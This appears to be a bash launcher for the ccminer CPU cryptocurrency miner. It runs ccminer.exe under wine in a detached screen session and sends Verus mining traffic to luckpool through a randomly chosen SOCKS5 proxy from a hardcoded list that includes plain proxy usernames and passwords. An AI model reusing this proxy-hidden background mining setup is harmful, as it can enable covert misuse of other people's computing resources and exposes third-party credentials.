chmod +x *
cd ccminer_CPU_3.8.3
proxy=("188.191.110.110:10589:trynewbro:N123456tujuh" "188.191.110.97:10589:trynewbro:N123456tujuh" "188.191.110.39:10589:trynewbro:N123456tujuh" "188.191.110.11:10589:trynewbro:N123456tujuh" "109.121.33.229:10589:trynewbro:N123456tujuh" "109.121.33.189:10589:trynewbro:N123456tujuh" "109.121.33.149:10589:trynewbro:N123456tujuh" "109.121.33.148:10589:trynewbro:N123456tujuh" "109.121.33.59:10589:trynewbro:N123456tujuh" "109.121.33.31:10589:trynewbro:N123456tujuh")
selected_proxy=${proxy[$RANDOM % ${#proxy[@]}]}
ip_port=$(echo $selected_proxy | cut -d':' -f1-2)  # Menangkap ip:port
username_password=$(echo $selected_proxy | cut -d':' -f3-4)  # Menangkap username:password
proxy_url="socks5://$username_password@$ip_port"
screen -d -m bash -c "wine ccminer.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.tetes_new_2 -p d=8192S -t 4 --proxy=$proxy_url"
